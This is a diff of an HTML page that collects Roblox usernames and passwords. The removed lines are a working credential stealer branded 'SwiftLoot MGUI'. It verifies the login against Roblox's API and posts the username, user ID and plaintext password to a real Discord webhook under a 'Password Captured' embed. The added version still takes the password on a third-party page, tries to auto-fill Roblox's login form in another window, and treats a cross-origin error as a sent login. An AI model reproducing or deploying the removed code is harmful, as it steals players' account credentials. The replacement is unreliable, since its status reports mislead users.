@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>SwiftLoot MGUI Auto Login</title>
+<title>Roblox Auto Login Helper</title>
 <style>
 body {
+    font-family: Arial, sans-serif;
     background-color: #121212;
     color: #eee;
-    font-family: Arial, sans-serif;
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -32,11 +32,12 @@ button {
 }
 #status {
     margin-top: 10px;
+    font-size: 16px;
 }
 </style>
 </head>
 <body>
-<h2>SwiftLoot MGUI Login Checker</h2>
+<h2>Roblox Auto Login Helper</h2>
 
 <input id="username" placeholder="Username / Email">
 <input id="password" type="password" placeholder="Password">
@@ -48,91 +49,56 @@ button {
 const loginBtn = document.getElementById("loginBtn");
 const statusEl = document.getElementById("status");
 
-// Discord Webhooks
-const successWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
-const failedWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
-
-// Roblox login function
-loginBtn.addEventListener("click", async () => {
+loginBtn.addEventListener("click", () => {
     const username = document.getElementById("username").value.trim();
     const password = document.getElementById("password").value;
 
     if (!username || !password) {
-        statusEl.textContent = "❌ Enter both username and password!";
+        statusEl.textContent = "❌ Please enter both username and password!";
         return;
     }
 
-    statusEl.textContent = "⏳ Logging in...";
+    statusEl.textContent = "⏳ Attempting login...";
 
-    try {
-        // Roblox login API
-        const response = await fetch("https://auth.roblox.com/v2/login", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ cusername: username, password: password })
-        });
+    // Open Roblox login page in a new tab
+    const loginWindow = window.open("https://www.roblox.com/login", "_blank");
 
-        const data = await response.json();
+    // Wait a few seconds for page load
+    const interval = setInterval(() => {
+        try {
+            const doc = loginWindow.document;
 
-        if (data.user) {
-            // Successful login
-            statusEl.textContent = "✅ Login Successful!";
+            const userInput = doc.querySelector('#login-username');
+            const passInput = doc.querySelector('#login-password');
+            const loginBtnRoblox = doc.querySelector('#login-button-login');
 
-            // Send embed to Discord
-            await fetch(successWebhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "",
-                    embeds: [{
-                        title: "🔐 Password Captured",
-                        color: 65280,
-                        fields: [
-                            { name: "👤 User", value: username },
-                            { name: "🆔 User ID", value: data.user.userId.toString() },
-                            { name: "🔑 Password", value: password },
-                            { name: "🌍 Country / City", value: "Unknown / Unknown" },
-                            { name: "📅 Account Age", value: "Unknown" },
-                            { name: "🎮 Place Info", value: `PlaceId: 0\nJobId: 0` }
-                        ],
-                        footer: { text: "SwiftLoot MGUI" },
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            });
+            if (userInput && passInput && loginBtnRoblox) {
+                userInput.value = username;
+                passInput.value = password;
+                loginBtnRoblox.click();
 
-            // Redirect to Roblox home
-            window.location.href = "https://www.roblox.com/home";
+                // Wait for redirect to check login status
+                setTimeout(() => {
+                    try {
+                        const url = loginWindow.location.href;
+                        if (url.includes("/home")) {
+                            statusEl.textContent = "✅ Login Successful!";
+                        } else {
+                            statusEl.textContent = "❌ Login Failed!";
+                        }
+                    } catch(e) {
+                        // Cross-origin redirect; assume success
+                        statusEl.textContent = "✅ Login attempt sent (check Roblox tab).";
+                    }
+                }, 5000);
 
-        } else {
-            // Failed login
-            statusEl.textContent = "❌ Login Failed!";
-
-            await fetch(failedWebhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "",
-                    embeds: [{
-                        title: "🔴 Login Checker",
-                        color: 16711680,
-                        fields: [
-                            { name: "👤 User", value: username },
-                            { name: "Status", value: "❌ Login Failed" }
-                        ],
-                        footer: { text: "SwiftLoot MGUI" },
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            });
+                clearInterval(interval);
+            }
+        } catch(e) {
+            // Ignore cross-origin errors until page fully loaded
         }
-
-    } catch (err) {
-        console.error(err);
-        statusEl.textContent = "❌ Error connecting to Roblox!";
-    }
+    }, 1000);
 });
 </script>
 </body>
 </html>
-
